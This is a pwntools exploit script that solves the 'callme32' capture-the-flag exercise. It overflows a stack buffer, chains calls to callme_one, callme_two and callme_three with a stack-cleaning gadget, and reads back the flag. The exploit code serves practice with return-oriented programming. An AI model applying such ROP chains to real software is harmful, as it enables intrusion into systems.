#/usr/bin/env python

from pwn import *


context.binary = './callme32'
context.log_level='debug'

io = process('./callme32')
elf = ELF('./callme32')

io.recv()
payload = 'A'*(0x28+0x4)
payload += p32(elf.plt['callme_one'])
payload += p32(0x080488a9)
payload += p32(1)+p32(2)+p32(3)
payload += p32(elf.plt['callme_two'])
payload += p32(0x080488a9)
payload += p32(1)+p32(2)+p32(3)
payload += p32(elf.plt['callme_three'])
payload += 'A'*4
payload += p32(1)+p32(2)+p32(3)

io.sendline(payload)
flag = io.recv()
log.info('flag:'+flag)

io.interactive()
